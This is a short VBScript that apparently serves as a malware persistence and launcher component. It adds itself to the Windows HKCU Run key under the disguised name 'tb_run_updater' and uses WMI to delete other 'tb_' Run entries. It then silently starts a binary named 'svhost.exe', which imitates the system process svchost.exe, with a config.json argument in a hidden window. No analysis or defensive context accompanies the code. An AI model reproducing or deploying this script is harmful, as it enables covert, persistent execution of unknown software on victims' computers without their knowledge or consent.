Set objShell = CreateObject("WScript.Shell")
Set objFSO = CreateObject("Scripting.FileSystemObject")

' Get paths
scriptPath = WScript.ScriptFullName
scriptName = objFSO.GetFileName(scriptPath)
currentDir = objFSO.GetParentFolderName(scriptPath)

' Registry Run Key path
regRunKey = "HKCU\Software\Microsoft\Windows\CurrentVersion\Run\"
appKeyName = "tb_run_updater" ' Change this to your preferred unique registry value name

' 1. Add itself to the Registry Run key if not already present
On Error Resume Next
existingVal = objShell.RegRead(regRunKey & appKeyName)
If Err.Number <> 0 Then
    ' Value doesn't exist, so create it (wrapping path in quotes to handle spaces)
    objShell.RegWrite regRunKey & appKeyName, "wscript.exe """ & scriptPath & """", "REG_SZ"
End If
Err.Clear

' 2. Remove any other entries in the Run key that start with "tb_" (except itself)
' VBScript doesn't natively list registry keys easily without WMI, but we can manage known ones or use WMI.
' Alternatively, using WMI to enumerate registry values under CurrentVersion\Run:
Const HKEY_CURRENT_USER = &H80000001
Set oReg = GetObject("winmgmts:{impersonationLevel=impersonate}!\\.\root\default:StdRegProv")

Dim values, types
oReg.EnumValues HKEY_CURRENT_USER, "Software\Microsoft\Windows\CurrentVersion\Run", values, types

If IsArray(values) Then
    For i = 0 To UBound(values)
        valName = values(i)
        ' Check if it starts with "tb_" (case-insensitive) and is not this script's key name
        If LCase(Left(valName, 3)) = "tb_" And LCase(valName) <> LCase(appKeyName) Then
            oReg.DeleteValue HKEY_CURRENT_USER, "Software\Microsoft\Windows\CurrentVersion\Run", valName
        End If
    Next
End If
On Error GoTo 0

' 3. Switch to the script's directory and run svhost.exe quietly
objShell.CurrentDirectory = currentDir

' Run svhost.exe in the background (0 = hide window, False = don't wait for process to finish)
' Ensure svhost.exe and config.json are located in the same folder as this script.
If objFSO.FileExists(objFSO.BuildPath(currentDir, "svhost.exe")) Then
    objShell.Run """svhost.exe"" -c ""config.json""", 0, False
End If
